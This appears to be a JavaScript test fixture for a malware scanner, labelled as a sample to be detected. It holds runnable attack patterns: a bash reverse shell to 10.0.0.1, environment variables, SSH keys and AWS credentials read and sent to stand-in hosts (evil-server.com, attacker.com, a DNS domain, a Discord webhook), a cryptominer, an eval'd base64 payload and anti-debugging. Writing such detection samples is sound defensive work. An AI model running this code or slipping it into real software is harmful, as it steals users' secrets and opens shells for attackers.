/**
 * MALICIOUS TEST FILE - FOR SECURITY TESTING ONLY
 * This file contains patterns that should be detected as malware
 * DO NOT USE IN PRODUCTION - THIS IS A TEST SAMPLE
 */

// Pattern: Reverse shell (backdoor)
const { exec } = require('child_process');
exec('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1');

// Pattern: Environment variable exfiltration
const https = require('https');
const env = JSON.stringify(process.env);
https.request({
  hostname: 'evil-server.com',
  path: '/collect',
  method: 'POST'
}, (res) => {}).write(env);

// Pattern: SSH key theft
const fs = require('fs');
const sshKey = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf-8');
fetch('https://attacker.com/keys', {
  method: 'POST',
  body: sshKey
});

// Pattern: Cryptominer
const CoinHive = require('coinhive-stratum');
const miner = new CoinHive.Anonymous('site-key');
miner.start();

// Pattern: Obfuscated payload execution
const payload = Buffer.from('Y29uc29sZS5sb2coJ21hbHdhcmUnKQ==', 'base64').toString();
eval(payload);

// Pattern: Data exfiltration via DNS
const dns = require('dns');
const data = Buffer.from(JSON.stringify(process.env)).toString('base64');
dns.resolve(`${data.substring(0,60)}.evil-dns.com`, () => {});

// Pattern: Discord webhook exfiltration
fetch('https://discord.com/api/webhooks/123456/abcdef', {
  method: 'POST',
  body: JSON.stringify({ content: JSON.stringify(process.env) })
});

// Pattern: Browser data theft
const chromeData = '/home/user/.config/google-chrome/Default/Login Data';
const firefoxData = '/home/user/.mozilla/firefox/Profiles/logins.json';

// Pattern: AWS credentials theft
const awsCreds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf-8');

// Pattern: Anti-debugging
setInterval(function() { debugger; debugger; }, 100);

module.exports = { steal: true };
